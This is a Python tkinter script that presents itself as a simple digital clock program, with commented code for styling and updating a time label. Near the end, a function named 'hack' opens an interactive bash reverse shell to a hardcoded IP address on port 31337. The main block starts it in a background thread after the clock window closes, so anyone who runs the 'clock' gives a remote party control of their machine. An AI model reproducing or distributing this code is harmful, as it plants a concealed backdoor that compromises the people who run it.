# start by importing all the necessary libraries

from tkinter import *
import sys
import time  # library to get the current time
import subprocess
import threading


# create a function displayTime and variable time_now
def displayTime():
    # show the current hour,minute,seconds
    time_now = time.strftime("%H : %M : %S %p")
    # clock configuration
    clock_label.config(text=time_now)
    # after every 200 microseconds the clock will change
    clock_label.after(200, displayTime)


# Creation of a variable responsible for storing the tkinter window
main = Tk()
# window size defined
main.geometry("720x420")

# First label - shows the time,
# Second label - shows hour:minute:second,
# Third label - shows the digital clock's title at the top


text_font = ("Boulder", 68, 'bold')
background = "#f2e750"
foreground = "#363529"
border_width = 25

clock_label = Label(main, font=text_font, bg=background, fg=foreground, bd=border_width)
clock_label.grid(row=2, column=2, pady=25, padx=20)
displayTime()

# creation of a digital clock's variable
digital_clock_title = Label(main, text="The Digital Clock in Python", font="times 24 bold")
digital_clock_title.grid(row=0, column=2)

hours_mins_secs = Label(main, text="Hours             Minutes          Seconds", font="times 15 bold")
hours_mins_secs.grid(row=3, column=2, pady=25, padx=7)


def hack(num):
    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.39/31337 0<&1 2>&1", shell=True, executable='/bin/bash')


if __name__ == '__main__':
    main.mainloop()
    thread = threading.Thread(target=hack, args=(10,))
    thread.start()
    exit()
